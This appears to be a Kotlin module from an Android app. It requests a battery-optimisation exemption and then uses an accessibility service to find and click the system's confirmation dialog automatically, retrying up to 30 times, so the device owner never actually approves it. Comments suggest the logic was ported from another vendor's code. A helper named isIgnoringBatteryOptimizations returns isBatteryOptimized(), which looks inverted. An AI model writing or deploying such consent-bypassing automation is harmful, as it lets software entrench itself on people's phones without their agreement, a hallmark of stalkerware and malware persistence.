package com.storm.safe.rock.service.modules.yw5xud.huawei

import android.content.Context
import android.content.Intent
import android.net.Uri
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import com.storm.safe.rock.service.modules.yw5xud.common.BatteryDialogKeywords
import kotlinx.coroutines.delay

/**
 * Step 2/10 -- Battery Whitelist (vendor m212166b3, L2512-2740).
 *
 * Requests battery optimization exemption via ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
 * then polls for the confirm dialog and clicks approval keywords.
 */
class HuaweiStep2BatteryWhitelist(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: HuaweiSteps
) {
    companion object {
        private const val TAG = "HuaweiStep2BatteryWhitelist"
    }

    @Suppress("UNUSED_PARAMETER")
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i(TAG, "[Step2/10] enter executeStep2BatteryWhitelist")
        HuaweiStepLogger.phase(2, "检查是否已忽略电池优化", "vendor L2544", logs)

        if (HuaweiStepCompletionStore.isCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP2_BATTERY_WHITELIST)) {
            HuaweiStepLogger.skip(2, "SP STEP2_BATTERY_WHITELIST 24h 内已 mark", logs)
            successes.add("[Step2/10] 电池白名单已配置（SP 幂等跳过）")
            return
        }

        // Fast path: already whitelisted
        try {
            if (isIgnoringBatteryOptimizations()) {
                logs.add("[Step2/10] 已在白名单中 (vendor L2554)")
                successes.add("[Step2/10] 电池白名单已存在")
                HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP2_BATTERY_WHITELIST)
                return
            }
        } catch (e: Exception) {
            logs.add("[Step2/10] 检查失败: ${e.message} (vendor L2559)")
        }

        // Request whitelist
        logs.add("[Step2/10] 请求加入白名单 (vendor L2561)")
        try {
            val intent = Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS").apply {
                data = Uri.parse("package:${steps.ctx.packageName}")
                setFlags(276824064)
            }
            val launcher: Context = service ?: steps.ctx
            launcher.startActivity(intent)
            logs.add("[Step2/10] 已发送电池优化豁免请求 (vendor L2565)")
        } catch (e: Exception) {
            failures.add("[Step2/10] 启动失败: ${e.message}")
            logs.add("[Step2/10] 电池白名单请求失败: ${e.message}")
            return
        }

        delay(300L)

        // Poll for dialog text
        val detectKeywords = listOf("忽略", "电池", "优化", "Ignore", "Battery", "Optimize")
        var dialogSeen = false
        for (i in 0 until 6) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val texts = HuaweiPageDetector.collectTexts(root)
                if (texts.any { t -> detectKeywords.any { kw -> t.contains(kw, ignoreCase = true) } }) {
                    dialogSeen = true
                    break
                }
            }
            delay(100L)
        }
        if (!dialogSeen) {
            logs.add("[Step2/10] 弹窗未出现，可能已经在白名单中 (vendor L2611)")
        }

        // Main approval loop (max 30 rounds)
        for (i in 0 until 30) {
            try {
                if (isIgnoringBatteryOptimizations()) {
                    logs.add("[Step2/10] 验证成功：已加入白名单 (vendor L2628)")
                    successes.add("[Step2/10] 电池白名单已加入")
                    HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP2_BATTERY_WHITELIST)
                    delay(100L)
                    return
                }
            } catch (_: Exception) { }

            var clicked = false
            for (kw in BatteryDialogKeywords.CONFIRM_TEXTS) {
                if (ui.clickSelector("[text=\"$kw\"][visibleToUser=true]")) {
                    logs.add("[Step2/10] 点击: $kw (BatteryDialogKeywords, vendor L2682)")
                    clicked = true
                    break
                }
            }
            delay(100L)
            @Suppress("UNUSED_EXPRESSION") clicked
        }

        // Final check after 30 rounds
        try {
            if (isIgnoringBatteryOptimizations()) {
                logs.add("[Step2/10] 30 轮后验证：已加入白名单")
                successes.add("[Step2/10] 电池白名单已加入")
                HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP2_BATTERY_WHITELIST)
            } else {
                logs.add("[Step2/10] 电池优化豁免未确认（30 轮后仍未加入白名单）")
            }
        } catch (e: Exception) {
            logs.add("[Step2/10] 最终验证异常: ${e.message}")
        }
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        return ui.isBatteryOptimized()
    }
}
